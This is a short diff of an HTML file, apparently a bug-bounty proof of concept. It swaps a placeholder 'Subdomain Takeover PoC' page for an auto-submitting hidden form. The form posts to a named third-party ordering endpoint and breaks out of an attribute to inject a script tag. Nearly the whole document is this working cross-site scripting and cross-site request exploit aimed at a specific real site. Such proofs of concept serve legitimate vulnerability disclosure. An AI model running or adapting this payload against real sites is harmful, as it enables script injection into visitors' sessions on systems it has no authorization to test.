@@ -1,8 +1,9 @@
-<!DOCTYPE html>
 <html>
 <body>
-  <h1>Subdomain Takeover PoC</h1>
-  <p>Asset: </p>
-  <p>Reported to  security team.</p>
+<form id="xss" method="POST" action="https://bestellservice.studierendenwerk-koblenz.de/quickadd/add/save/">
+  <input type="hidden" name="sku" value='001. A.000"><ScRiPt>alert(document.domain)</ScRiPt>' />
+  <input type="hidden" name="qty" value="1" />
+</form>
+<script>document.getElementById("xss").submit();</script>
 </body>
 </html>
